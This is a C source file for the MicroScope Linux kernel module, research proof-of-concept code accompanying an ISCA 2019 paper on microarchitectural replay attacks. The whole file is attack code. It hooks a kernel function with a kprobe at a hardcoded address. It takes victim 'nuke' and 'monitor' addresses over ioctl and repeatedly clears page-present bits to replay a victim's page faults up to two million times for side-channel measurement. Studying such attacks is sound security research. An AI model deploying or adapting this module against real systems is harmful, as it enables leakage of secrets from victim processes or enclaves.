/*
 * Author: Dimitrios Skarlatos
 * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
 *
 * The microscope_mod is a kernel module that can be used to perform microarchitectural
 * replay attacks using page faults.
 *
 * More details in :
 * MicroScope: Enabling Microarchitectural Replay Attacks.
 * Dimitrios Skarlatos, Mengjia Yan, Bhargava Gopireddy, Read Sprabery, Josep Torrellas,
 * and Christopher W. Fletcher. Proceedings of the 46th Intl. Symposium on Computer
 * Architecture (ISCA), Phoenix, USA, June 2019.
 */

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>

#include "microscope_mod.h"
#include "util.h"

#define SUCCESS 0
#define DEVICE_NAME "microscope_mod"
#define BUF_LEN 80
// Retries is the number of computations we want to monitor
#define RETRIES 2000000
// number of replays to gain enough confidence in the result
#define CONFIDENCE 2
// Cache line step from each profiling address to the next
#define STEP 64
#define MAX_ADDR 100
// Profile retries after defines the number of steps we will perform
#define SCAN_RETRIES 48

MODULE_LICENSE("GPL v2");

static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
static uint32_t set_nuke = 0, set_monitor = 0;
static uint32_t cur_nuke = 0;
static uint32_t switches = 0;

static struct kprobe kp;

static int Device_Open = 0;

struct attack_info the_info[MAX_ADDR];
struct attack_info *ptr_info;
extern pte_t *fault_pte;

static char Message[BUF_LEN];
static char *Message_Ptr;

/*
 * device_open is invoked when the victim connects to the char device.
 */
static int device_open(struct inode *inode, struct file *file) {
  if (Device_Open) {
    return -EBUSY;
  }

  Device_Open++;
  Message_Ptr = Message;
  try_module_get(THIS_MODULE);

  return SUCCESS;
}

/*
 * device_release is invoked when the victim disconnects from the char device.
 */
static int device_release(struct inode *inode, struct file *file) {
  Device_Open--;

  module_put(THIS_MODULE);
  return SUCCESS;
}

/*
 * device_write identifies the requested write from the IOCTL and routes it to
 * the proper function.
 */
static ssize_t device_write(struct file *file, const char __user *buffer, size_t length,
                            loff_t *offset, enum call_type type) {
  int i = 0;
  uint64_t address;

  for (i = 0; i < length && i < BUF_LEN; i++) {
    get_user(Message[i], buffer + i);
  }

  // printk(KERN_INFO "Message length %lu\n", length);
  // printk(KERN_INFO "Message %s\n", Message);

  Message_Ptr = Message;
  kstrtou64(Message_Ptr, 0, &address);

  //  printk(KERN_INFO "Received Address %p\n", (void *)address);

  switch (type) {
    case NUKE_ADDR:
      printk(KERN_INFO "Setting up nuke id %u -> addr %p\n", set_nuke, (void *)address);
      setup_nuke_structs(&ptr_info[set_nuke], address);
      set_nuke++;
      break;
    case MONITOR_ADDR:
      printk(KERN_INFO "Setting up monitor id %u -> addr %p\n", set_nuke,
             (void *)address);
      setup_monitor_structs(&ptr_info[0], address, set_monitor);
      set_monitor++;
      break;
    case PF:
      pf_prep(&ptr_info[0], ptr_info[0].nuke_addr, set_monitor);
      cur_nuke = 0;
      fault_cnt = 0;
      fault_fault_cnt = 0;
      break;
    default:
      break;
  }

  return i;
}

/*
 * handler_fault is invoked in the case of a nested page fault while we were
 * executing the trampoline code (see post_handler).
 * Usually this means that we tried to access an address we shouldn't. In this
 * scenario we stop the attack gracefully. In normal operation fault-on-fault
 * should not be triggered for poc_v0
 */
int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr) {
  fault_fault_cnt++;
  printk(KERN_INFO "MicroScope_mod: Fult-on-Fault counter %llu, fault counter %llu\n",
         fault_cnt, fault_fault_cnt);
  if (fault_pte) {
    *fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
    printk(KERN_INFO "MicroScope_mod: Fault-on-Fault resetting present bit %llu\n",
           fault_cnt);
  }
  set_attack_value(NULL, 0);
  printk(KERN_INFO "MicroScope_mod: Fault-on-Fault  Attack failed %llu\n", fault_cnt);

  // we let the kprobe handler to handle the page fault
  return 0;
}

/*
 * pre_handler is invoked before the notify_attack (memory.c)
 */
int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }

/*
 * post_handler is invoked after a notify_attack (memory.c) has finished.
 * At this point we know that a minor page fault on the replay handle was caused
 * and we proceed with the next steps of the attack. The current logic is used to simply
 * replay a single page fault for #RETRIES
 */
void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags) {
  uint64_t old_time = 0, wait_time = 0;
  uint64_t v0 = 0, v1 = 0;

  if (fault_pte) {
    v0 = pte_pfn(*fault_pte);
    v1 = pte_pfn(*(ptr_info[cur_nuke].nuke_ptep));
    // double checking that this is the correct page fault
    if (v0 == v1) {
      // we reached the max number of retries we are done with the attack
      if (fault_cnt == RETRIES) {
        printk(KERN_INFO "MicroScope_mod: Reached maximum retries %u\n", RETRIES);
        if (fault_pte) {
          *fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
          printk(KERN_INFO "MicroScope_mod: Resetting present bit %u\n", switches);
        }
        set_attack_value(NULL, 0);
        printk(KERN_INFO "MicroScope_mod: Attack is done %u\n", switches);
      }
      // the attack is still underway
      else {
        // we are still under the limit of retries
        if (fault_cnt < RETRIES) {
          if (fault_pte) {
            // padding
            old_time = 0;
            wait_time = 0;
            while (wait_time < 10000) {
              old_time = rdtsc();
              wait_time += rdtsc() - old_time;
            }
            // printk(KERN_INFO "MicroScope_mod: replay %llu\n", fault_cnt);
            pf_redo(&ptr_info[0], ptr_info[0].nuke_addr);
            // printk(KERN_INFO "MicroScope_mod: renuked %llu\n", fault_cnt);

            // padding
            old_time = 0;
            wait_time = 0;
            while (wait_time < 10000) {
              old_time = rdtsc();
              wait_time += rdtsc() - old_time;
            }
          }
        }
      }
      fault_cnt++;
    }
  }
}

/*
 * device_ioctl services IOCTL requests to this character device
 * MSG - Message passing through the char device
 * NUKE_ADDR - Passing the address to be nuke, the replay handle
 * MONITOR_ADDR - Passing the base monitor address, we will search for the
 * actual one
 * PREP_PF - Setting up the replay mechanism through minor page faults
 */
long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param) {
  int i = 0;
  char *temp;
  char ch;

  printk(KERN_INFO "IOCTL param %u\n", ioctl_num);

  temp = (char *)ioctl_param;

  get_user(ch, temp);
  for (i = 0; ch && i < BUF_LEN; i++, temp++) {
    get_user(ch, temp);
  }

  switch (ioctl_num) {
    case IOCTL_SET_MSG:
      device_write(file, (char *)ioctl_param, i, 0, MSG);
      break;

    case IOCTL_SET_NUKE_ADDR:
      device_write(file, (char *)ioctl_param, i, 0, NUKE_ADDR);
      break;

    case IOCTL_SET_MONITOR_ADDR:
      device_write(file, (char *)ioctl_param, i, 0, MONITOR_ADDR);
      break;

    case IOCTL_PREP_PF:
      device_write(file, (char *)ioctl_param, i, 0, PF);
      break;

    default:
      break;
  }

  return SUCCESS;
}

/*
 * Operations Struct - Define the supported operations
 */
struct file_operations Fops = {
    .unlocked_ioctl = device_ioctl,
    .open = device_open,
    .release = device_release,
};

/*
 * init_mudule registers the device and the trampoline code
 */
int init_module() {
  int ret_val;

  ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &Fops);
  if (ret_val < 0) {
    printk(KERN_ALERT "Registering the device failed with %d\n", ret_val);
    return ret_val;
  }

  ptr_info = &the_info[0];
  ptr_info->error = 0;
  kp.pre_handler = pre_handler;
  kp.post_handler = post_handler;
  kp.fault_handler = handler_fault;

  // need to find notify attack through the kernel symbols
  kp.addr = (kprobe_opcode_t *)0xffffffff811be710;
  ret_val = register_kprobe(&kp);

  if (ret_val < 0) {
    printk(KERN_ALERT "Registering probe failed with %d\n", ret_val);
    return ret_val;
  }
  set_print_msg_attack(0);

  printk(KERN_INFO "If a channel does not exist run: mknod %s c %d 0\n", DEVICE_FILE_NAME,
         MAJOR_NUM);

  return 0;
}

/*
 * cleanup_module unregisters the device, the probes, and disables the attack
 */
void cleanup_module() {
  unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
  unregister_kprobe(&kp);
  set_print_msg_attack(0);
  set_attack_value(NULL, 0);
}
